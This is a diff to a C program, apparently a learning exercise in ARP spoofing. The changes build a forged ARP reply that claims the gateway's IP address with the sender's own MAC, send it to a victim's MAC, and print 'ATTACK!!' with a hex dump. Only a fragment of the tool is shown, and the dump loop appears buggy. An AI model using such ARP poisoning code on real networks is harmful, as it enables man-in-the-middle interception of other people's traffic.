@@ -96,6 +96,7 @@ int main(int argc, char* argv[])
     memcpy(&flush[32], "\x00\x00\x00\x00\x00\x00", 6);
     mempcpy(&flush[38], targetIP, 4);
     //input arp_payload
+    printf("ARP REPLY:\n");
     for(int i = 1; sizeof(flush) >= i; i++){
         printf("%02X ", flush[i - 1]);
         if(i % 16 == 0){
@@ -127,16 +128,23 @@ int main(int argc, char* argv[])
             struct ARP_PACKET *arp_reply_reply;
             arp_reply_reply = (struct ARP_PACKET*)packet;
             //change sender ip to gateway
-            arp_reply_reply->arp_py.sender_ip = gatewayip;
+            memcpy(arp_reply_reply->arp_py.sender_ip, gatewayip, 4);
             //target mac is victim's mac
-            arp_reply_reply->arp_py.target_mac = arp_reply->ether_h.ether_shost;
+            memcpy(arp_reply_reply->arp_py.target_mac, arp_reply->ether_h.ether_shost, 6);
+            memcpy(arp_reply_reply->ether_h.ether_dhost, arp_reply->ether_h.ether_shost, 6);
             //sender mac is mymac
-
-
+            memcpy(arp_reply_reply->arp_py.sender_mac, arp_reply->ether_h.ether_dhost, 6);
+            memcpy(arp_reply_reply->ether_h.ether_shost, arp_reply->ether_h.ether_dhost, 6);
+            printf("ATTACK!!");
+            for(int i = 1; sizeof(arp_reply_reply) >= i; i++){
+                printf("%02X ", packet[i - 1]);
+                if(i % 16 == 0){
+                    printf("\n");
+                }
+            }
         }
+
+
     }
-
-
 }
-
 
